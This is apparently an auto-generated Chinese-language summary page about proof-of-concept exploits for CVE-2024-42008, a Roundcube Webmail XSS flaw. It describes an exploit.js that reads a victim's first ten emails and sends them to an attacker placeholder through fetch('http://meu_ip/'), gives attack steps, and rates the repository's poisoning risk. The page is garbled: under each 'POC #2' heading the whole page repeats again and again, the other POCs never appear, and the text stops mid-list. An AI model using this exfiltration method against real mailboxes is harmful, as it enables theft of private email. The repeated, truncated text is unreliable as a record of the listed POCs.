# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)

---

## POC #2

**来源**: [CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md](../2024/CVE-2024-42008-rpgsec_Roundcube-CVE-2024-42008-POC.md)

# CVE-2024-42008

> 📦 该CVE有 **3** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md](../2024/CVE-2024-42008-Foxer131_CVE-2024-42008-9-exploit.md)

## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
